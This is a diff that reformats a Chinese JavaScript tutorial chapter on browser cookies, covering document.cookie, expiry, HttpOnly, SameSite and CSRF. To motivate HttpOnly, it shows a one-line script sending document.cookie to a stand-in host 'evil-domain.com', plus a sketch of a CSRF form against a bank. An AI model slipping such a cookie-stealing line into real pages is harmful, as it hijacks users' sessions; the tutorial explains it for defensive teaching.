@@ -2,39 +2,39 @@
 
 ## 概述
 
-Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。
+Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过 4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。
 
 Cookie 主要保存状态信息，以下是一些主要用途。
 
-- 对话（session）管理：保存登录、购物车等需要记录的信息。
-- 个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。
-- 追踪用户：记录和分析用户行为。
+-   对话（session）管理：保存登录、购物车等需要记录的信息。
+-   个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。
+-   追踪用户：记录和分析用户行为。
 
 Cookie 不是一种理想的客户端储存机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。
 
 每个 Cookie 都有以下几方面的元数据。
 
-- Cookie 的名字
-- Cookie 的值（真正的数据写在这里面）
-- 到期时间（超过这个时间会失效）
-- 所属域名（默认为当前域名）
-- 生效的路径（默认为当前网址）
+-   Cookie 的名字
+-   Cookie 的值（真正的数据写在这里面）
+-   到期时间（超过这个时间会失效）
+-   所属域名（默认为当前域名）
+-   生效的路径（默认为当前网址）
 
 举例来说，用户访问网址`www.example.com`，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为`www.example.com`，生效路径为根路径`/`。如果 Cookie 的生效路径设为`/forums`，那么这个 Cookie 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。
 
 用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。
 
 ```javascript
-window.navigator.cookieEnabled // true
+window.navigator.cookieEnabled; // true
 ```
 
 `document.cookie`属性返回当前网页的 Cookie。
 
 ```javascript
-document.cookie // "id=foo;key=bar"
+document.cookie; // "id=foo;key=bar"
 ```
 
-不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。
+不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过 30 个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。
 
 浏览器的同源政策规定，两个网址只要域名相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，`http://example.com`设置的 Cookie，可以被`https://example.com`读取。
 
@@ -140,8 +140,8 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 
 服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。
 
-- Cookie 的各种属性，比如何时过期。
-- 哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。
+-   Cookie 的各种属性，比如何时过期。
+-   哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。
 
 ## Cookie 的属性
 
@@ -174,7 +174,8 @@ Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
 `HttpOnly`属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是`document.cookie`属性、`XMLHttpRequest`对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。
 
 ```javascript
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+    "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的`HttpOnly`属性，上面代码就不会读到该 Cookie。
@@ -192,33 +193,31 @@ Set-Cookie:id=a3fWa;
 用户后来又访问了恶意网站`malicious.com`，上面有一个表单。
 
 ```html
-<form action="your-bank.com/transfer" method="POST">
-  ...
-</form>
+<form action="your-bank.com/transfer" method="POST">...</form>
 ```
 
 用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，表单一般都带有一个随机 token，告诉服务器这是真实请求。
 
 ```html
 <form action="your-bank.com/transfer" method="POST">
-  <input type="hidden" name="token" value="dad3weg34">
-  ...
+    <input type="hidden" name="token" value="dad3weg34" />
+    ...
 </form>
 ```
 
 这种第三方网站引导发出的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。
 
 ```html
-<img src="facebook.com" style="visibility:hidden;">
+<img src="facebook.com" style="visibility:hidden;" />
 ```
 
 浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。
 
 Cookie 的`SameSite`属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。
 
-> - Strict
-> - Lax
-> - None
+> -   Strict
+> -   Lax
+> -   None
 
 **（1）Strict**
 
@@ -241,14 +240,14 @@ Set-Cookie: CookieName=CookieValue; SameSite=Lax;
 导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。
 
 | 请求类型  |                 示例                 |    正常情况 | Lax         |
-|-----------|:------------------------------------:|------------:|-------------|
-| 链接      | `<a href="..."></a>`                 | 发送 Cookie | 发送 Cookie |
+| --------- | :----------------------------------: | ----------: | ----------- |
+| 链接      |         `<a href="..."></a>`         | 发送 Cookie | 发送 Cookie |
 | 预加载    | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
-| GET 表单  | `<form method="GET" action="...">`   | 发送 Cookie | 发送 Cookie |
+| GET 表单  |  `<form method="GET" action="...">`  | 发送 Cookie | 发送 Cookie |
 | POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送      |
-| iframe    | `<iframe src="..."></iframe>`        | 发送 Cookie | 不发送      |
-| AJAX      | `$.get("...")`                       | 发送 Cookie | 不发送      |
-| Image     | `<img src="...">`                    | 发送 Cookie | 不发送      |
+| iframe    |    `<iframe src="..."></iframe>`     | 发送 Cookie | 不发送      |
+| AJAX      |            `$.get("...")`            | 发送 Cookie | 不发送      |
+| Image     |          `<img src="...">`           | 发送 Cookie | 不发送      |
 
 设置了`Strict`或`Lax`以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。
 
@@ -275,16 +274,16 @@ Set-Cookie: widget_session=abc123; SameSite=None; Secure
 读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有`HTTPOnly`属性。
 
 ```javascript
-document.cookie // "foo=bar;baz=bar"
+document.cookie; // "foo=bar;baz=bar"
 ```
 
 上面代码从`document.cookie`一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。
 
 ```javascript
-var cookies = document.cookie.split(';');
+var cookies = document.cookie.split(";");
 
 for (var i = 0; i < cookies.length; i++) {
-  console.log(cookies[i]);
+    console.log(cookies[i]);
 }
 // foo=bar
 // baz=bar
@@ -293,7 +292,7 @@ for (var i = 0; i < cookies.length; i++) {
 `document.cookie`属性是可写的，可以通过它为当前网站添加 Cookie。
 
 ```javascript
-document.cookie = 'fontSize=14';
+document.cookie = "fontSize=14";
 ```
 
 写入的时候，Cookie 的值必须写成`key=value`的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用`encodeURIComponent`方法达到。
@@ -301,9 +300,9 @@ document.cookie = 'fontSize=14';
 但是，`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。
 
 ```javascript
-document.cookie = 'test1=hello';
-document.cookie = 'test2=world';
-document.cookie
+document.cookie = "test1=hello";
+document.cookie = "test2=world";
+document.cookie;
 // test1=hello;test2=world
 ```
 
@@ -319,18 +318,21 @@ document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
 
 各个属性的写入注意点如下。
 
-- `path`属性必须为绝对路径，默认为当前路径。
-- `domain`属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是`example.com`，就不能将其设为`foo.com`。该属性默认为当前的一级域名（不含二级域名）。
-- `max-age`属性的值为秒数。
-- `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。
+-   `path`属性必须为绝对路径，默认为当前路径。
+-   `domain`属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是`example.com`，就不能将其设为`foo.com`。该属性默认为当前的一级域名（不含二级域名）。
+-   `max-age`属性的值为秒数。
+-   `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。
 
 `document.cookie`写入 Cookie 的例子如下。
 
 ```javascript
-document.cookie = 'fontSize=14; '
-  + 'expires=' + someDate.toGMTString() + '; '
-  + 'path=/subdirectory; '
-  + 'domain=*.example.com';
+document.cookie =
+    "fontSize=14; " +
+    "expires=" +
+    someDate.toGMTString() +
+    "; " +
+    "path=/subdirectory; " +
+    "domain=*.example.com";
 ```
 
 Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。
@@ -338,16 +340,15 @@ Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。
 删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。
 
 ```javascript
-document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
+document.cookie = "fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT";
 ```
 
-上面代码中，名为`fontSize`的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。
+上面代码中，名为`fontSize`的 Cookie 的值为空，过期时间设为 1970 年 1 月 1 月零点，就等同于删除了这个 Cookie。
 
 ## 参考链接
 
-- [HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies), by MDN
-- [Using the Same-Site Cookie Attribute to Prevent CSRF Attacks](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/)
-- [SameSite cookies explained](https://web.dev/samesite-cookies-explained)
-- [Tough Cookies](https://scotthelme.co.uk/tough-cookies/), Scott Helme
-- [Cross-Site Request Forgery is dead!](https://scotthelme.co.uk/csrf-is-dead/), Scott Helme
-
+-   [HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies), by MDN
+-   [Using the Same-Site Cookie Attribute to Prevent CSRF Attacks](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/)
+-   [SameSite cookies explained](https://web.dev/samesite-cookies-explained)
+-   [Tough Cookies](https://scotthelme.co.uk/tough-cookies/), Scott Helme
+-   [Cross-Site Request Forgery is dead!](https://scotthelme.co.uk/csrf-is-dead/), Scott Helme
